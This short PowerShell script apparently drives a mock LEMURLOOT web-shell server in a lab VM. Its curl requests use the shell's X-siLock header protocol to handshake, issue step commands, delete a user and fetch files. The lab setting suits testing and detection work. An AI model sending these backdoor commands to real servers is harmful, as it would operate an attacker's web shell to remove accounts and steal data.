# PowerShell script to exercise the mock LEMURLOOT server
# Replace the server IP if your Ubuntu VM has a different address
$S = "<ADD_YOUR_IP>"
$G = "11111111-1111-1111-1111-111111111111"
$URL = "http://$S`:8002/human2.aspx"

Write-Host "== Probe (404 expected) =="
curl.exe -i $URL
Write-Host "`n"

Write-Host "== Handshake-only =="
curl.exe -i -H "X-siLock-Comment: $G" $URL
Write-Host "`n"

Write-Host "== Handshake + Step command (Step1 = -1) =="
curl.exe -i -H "X-siLock-Comment: $G" -H "X-siLock-Step1: -1" $URL
Write-Host "`n"

Write-Host "== Delete-user Step (Step1 = -2) =="
curl.exe -i -H "X-siLock-Comment: $G" -H "X-siLock-Step1: -2" $URL
Write-Host "`n"

Write-Host "== File fetch example (Step2/Step3) =="
curl.exe -i -H "X-siLock-Comment: $G" -H "X-siLock-Step2: 123" -H "X-siLock-Step3: 456" $URL
Write-Host "`n"
